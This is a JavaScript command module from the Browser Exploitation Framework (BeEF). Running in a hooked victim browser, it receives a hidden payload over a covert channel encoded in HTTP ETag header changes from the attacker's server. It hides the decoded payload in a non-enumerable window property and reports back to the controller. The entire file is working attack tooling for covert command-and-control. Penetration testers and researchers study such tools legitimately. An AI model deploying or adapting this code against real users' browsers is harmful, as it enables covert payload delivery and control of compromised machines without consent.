//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//
//

beef.execute(function(){  
    var start_time    =  0;
    var origin        = '';
    var header        = '';
    var message       = '';
    var id            = "<%= @command_id %>";
    var curl          = "<%= @command_url %>";
    var payload_name  = "<%= @payload_name %>";

    function getHeader(url, mode)
    {
	    var xhr = new XMLHttpRequest();
	    xhr.open('GET', url, mode);
	    xhr.send();
	    if (xhr.status == 404){
		    throw "message_end"
	    }
	    return xhr.getResponseHeader('ETag');
    }

    function start( origin, id )
    {
        start_time = (new Date()).getTime();
        header = getHeader( origin + '/etag/' + id + '/start', false);
    }

    function decode( bin_message )
    {
        arr = [];
        for( var i = 0; i < bin_message.length; i += 8 ) { 
            arr.push(bin_message.substr(i, 8)); 
        }
        var message = "";
        for( i = 0; i < arr.length; i++ ){
            message += String.fromCharCode(parseInt(arr[i],2));
        }
        return message;
    }

    function get_data( origin, id )
    {
        var interval = setInterval( function()
                {
                    try{
                        newHeader = getHeader( origin + '/etag/' + id, false); 
                    }
                    catch(e){
                        // The message is terminated so finish
                        clearInterval(interval);
                        final_message=decode( message );

                        delta = ((new Date()).getTime() - start_time)/1000;
                        bits_per_second = "" + message.length/delta; 

                        //Save the message in the Window
                        if (window.hasOwnProperty(payload_name))
                            window[payload_name] = final_message
                        else
                            Object.defineProperty(window,payload_name, { value: final_message,
                                                                         writable: true,
                                                                        enumerable: false });
                        beef.net.send(curl, parseInt(id),'etag_tunnel=true' + '&bps=' + bits_per_second);
                        return;
                    }
                    if (newHeader!==header){
                        message = message + '1';
                        header  = newHeader;
                    } else {
                        message = message + '0';
                    }
                }, 100, header, message);
    }
    function get_message( origin, id  )
    {
        setTimeout( start( origin, id ), 500 );
        setTimeout( get_data( origin, id ), 500) ;
    }
    get_message( origin, id );
});
